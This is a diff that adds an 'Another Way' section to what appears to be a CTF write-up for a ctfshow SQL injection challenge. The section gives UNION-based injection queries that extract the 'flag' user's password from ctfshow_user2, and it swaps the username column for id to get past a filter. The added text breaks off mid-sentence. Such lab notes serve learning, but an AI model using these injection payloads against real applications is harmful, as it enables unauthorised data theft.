@@ -63,3 +63,16 @@ use:
 We can decode the password.
 
 ![[Pasted image 20241218064420.png]]
+
+## Another Way
+```SQL
+select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select username, password from ctfshow_user2 where username = 'flag' limit 1;
+```
+to
+```SQL
+select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select id, password from ctfshow_user2 where username = 'flag' limit 1;
+```
+
+change username to id, so tha
+
+![[Pasted image 20241219064028.png]]
